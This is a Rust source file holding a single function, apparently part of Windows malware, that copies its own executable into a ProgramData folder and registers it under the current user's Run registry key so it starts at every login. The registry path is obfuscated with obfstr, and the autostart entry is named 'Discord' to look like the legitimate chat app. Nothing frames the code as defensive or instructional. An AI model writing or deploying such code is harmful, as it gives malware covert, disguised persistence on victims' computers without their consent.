use std::env;
use std::fs;
use std::path::Path;
use winreg::enums::*;
use winreg::RegKey;
use obfstr::obfstr as s;

pub fn setup_persistence(sub_folder: &str, binary_name: &str) -> std::io::Result<()> {
    let current_exe = env::current_exe()?;
    
    let target_dir = format!(r"C:\ProgramData\{}", sub_folder);
    let target_path = format!(r"{}\{}", target_dir, binary_name);

    if !Path::new(&target_dir).exists() {
        fs::create_dir_all(&target_dir)?;
    }

    if current_exe != Path::new(&target_path) {
        fs::copy(&current_exe, &target_path)?;
    }

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = s!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let (key, _disp) = hkcu.create_subkey(path)?;
    
    key.set_value("Discord", &target_path)?;

    Ok(())
}